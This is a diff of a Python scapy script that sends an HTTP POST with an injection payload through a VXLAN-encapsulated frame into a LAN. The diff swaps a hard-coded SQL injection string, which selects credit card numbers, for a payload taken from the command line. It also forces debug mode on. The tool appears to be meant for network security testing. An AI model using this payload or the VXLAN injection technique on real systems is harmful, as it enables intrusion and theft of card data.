@@ -5,7 +5,7 @@
 Usage:
 ./http_asym.py IP Port debug 
 
-./http_asym.py 10.0.0.10 80 debug
+./http_asym.py 10.0.0.10 80 
 
  """
 from scapy.all import *
@@ -32,7 +32,8 @@ http_port = int(sys.argv[2])
 destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 
-injection_string = '1 UNION ALL SELECT cardnumber,1 FROM creditcard WHERE "1"="1'
+#injection_string = '1 UNION ALL SELECT cardnumber,1 FROM creditcard WHERE "1"="1'
+injection_string = sys.argv[3]
 cont_length = len(injection_string)
 getStr = 'POST / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + str(cont_length) + '\r\n\r\n' + injection_string
 
@@ -50,10 +51,11 @@ threads = []
 Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20,"ECE": 0x40,"CWR": 0x80}
 
 ### Check if debug is enabled
-if len(sys.argv) > 3:
-    debug = 1
-else:
-    debug = 0
+# if len(sys.argv) > 3:
+#     debug = 1
+# else:
+#     debug = 0
+debug = 1
 
 ### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
 VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
